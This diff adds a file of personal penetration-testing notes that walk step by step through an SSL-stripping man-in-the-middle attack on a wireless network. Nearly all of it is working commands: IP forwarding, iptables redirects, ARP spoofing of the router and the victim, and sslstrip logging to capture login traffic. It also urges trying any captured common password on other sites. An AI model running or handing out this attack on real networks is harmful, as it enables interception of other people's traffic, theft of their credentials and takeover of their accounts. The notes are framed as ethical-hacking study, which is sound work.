@@ -1,0 +1,72 @@
+PenTesting / Ethical Hacking Notes: 
+
+SEE IF THERE IS A WAY TO MAKE THIS WORK AGAINST TLS
+
+- TOPIC: SSL Strip
+
+1. once you are auth'ed on a wireless network you are able to monitor the traffic. 
+2. You wont see anything cool, until you break it: SSL Strip breaks HTTPS into HTTP, then you can see the traffic. 
+3. if you do not have it: 
+"yum install sslstrip -y"
+This is installed on kali
+
+4. you will also need to do some DNS spoofing using dsniff. 
+This would be a type of man in the middle attack 
+This is installedon kali
+This is going to be browser and site dependant so it wont work 100% of the time, but if you get a common password try it out on other sites! 
+
+***LAUNCHING THE ATTACK***
+
+5. enable ip forwarding on your machine:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+you can check that this is working with 
+"cat /proc/sys/net/ipv4/ip_forward"
+
+6. configure traffic redirect using iptables. 
+-t nat: tables for Network Address Translation
+-A PREROUTING: is for append the PREROUTING
+-p specify a protocol 
+--destination-port 80: in this case 80
+-j REDIRECT --to-port 8080: redirect traffic to 8080
+SSLSTRIP is listening on 8080
+
+"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
+
+to verify: 
+"iptables -t nat -L PREROUTING"
+output should be: 
+"REDIRECT   tcp  --  anywhere    anywhere   tcp dpt:http redir ports 8080"
+
+7. now find a target with NMAP reference your notes on this topic. <-------!!!! "-o" will give you os
+
+8. you will now need to use arp spoof to convince the router that you are the victim machine, and you will need to convince the victim machine that you are the router.
+
+- in one terminal: 
+"arpspoof -i NETWORKINTERFACE -t ROUTER IP -r VICTIM MACHINE"
+
+- in another terminal: 
+"arpspoof -i NETWORKINTERFACE -t VICTIM MACHINE -r ROUTER IP"
+
+If you run into issues with port 8080 make sure it is open 
+"iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT"
+
+check with: 
+root@kali:/usr/bin# iptables -L INPUT
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http-alt
+
+9. In a new terminal  start up sslstrip to listen on 8080:
+"sslstrip -l 8080"
+
+10. In one more terminal tail the logfile that will be produced by sslstrip:
+"tail -f sslstrip.log"
+
+-f: live feed
+
+11. open a browser on the victim and generate some traffic, and you will see the traffic show up in the log. 
+
+12. Start with IE...wow
+You are basically looking for instance where http is used on login. 
+Firefox and Chrome are also weak on some sites. 
